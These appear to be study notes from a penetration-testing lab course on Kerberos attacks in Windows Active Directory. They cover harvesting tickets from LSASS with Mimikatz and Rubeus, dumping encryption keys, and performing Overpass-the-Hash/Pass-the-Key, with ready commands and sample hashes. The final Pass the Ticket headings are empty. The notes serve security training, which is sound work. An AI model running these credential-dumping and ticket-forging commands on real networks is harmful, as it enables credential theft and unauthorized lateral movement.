
- On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. 
- Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

## Harvesting Kerberos Tickets from Windows
We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:

- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.



Note: 
1. The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory.
2. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi` .
3. If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
4. 
```
At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
```


### Mimikatz - Export Tickets

```powershell
mimikatz.exe privilege::debug "sekurlsa::tickets /export"
```

### Rubeus - Export Tickets

```powershell
Rubeus.exe dump /nowrap
```


## Pass the Key or OverPass the Hash
- The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).
- To forge our tickets, we need to have the user's hash
- we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.
- once we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

### Mimikatz - Extract Kerberos Keys

```
mimikatz.exe privilege::debug "sekurlsa::ekeys"
```

### Mimikatz - Pass the Key or OverPass the Hash
```
mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
```
### Rubeus - Pass the Key or OverPass the Hash
Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

## Pass the Ticket (PtT)

### Rubeus - Pass the Ticket

### Mimikatz - Pass the Ticket